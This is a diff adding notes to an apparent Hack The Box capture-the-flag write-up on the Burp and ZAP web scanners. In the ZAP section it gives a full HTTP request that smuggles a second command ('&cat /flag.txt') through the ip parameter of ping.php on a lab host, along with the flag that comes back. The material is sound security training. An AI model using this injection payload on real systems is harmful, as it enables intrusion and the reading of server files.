@@ -73,8 +73,27 @@ When we rerun that request and check the response, we find `HTB{fuzz1n6_my_f1r57
 
 ## Burp Scanner
 
+This section covers Burp Scanner which is a pro only tool. So I could not follow along, but this tool helps to identify vulnerabilities in web Apps.
+
 ## ZAP Scanner
 
+This section covers the Zap web Scanner. 
+
+It starts by covering Zap Spider, which is a web crawler. This will provide a site map of the site and perform a passive scan of all pages found.
+
+Then we can do an active scan of this site. Once we scan it, which takes a long time, it finds a few high alerts including a remote code execution vulnerability. The task on this test is to read /flag.txt.
+
+So to do this we run:
+`GET http://94.237.55.163:40627/devtools/ping.php?ip=127.0.0.1%26cat+%2Fflag.txt HTTP/1.1
+host: 94.237.55.163:40627
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0
+pragma: no-cache
+cache-control: no-cache
+referer: http://94.237.55.163:40627/index.php/2021/08/11/customer-support/
+content-length: 0
+`
+
+And the response shows `HTB{5c4nn3r5_f1nd_vuln5_w3_m155}`
 ## Extensions
 
 # Skills Assessment
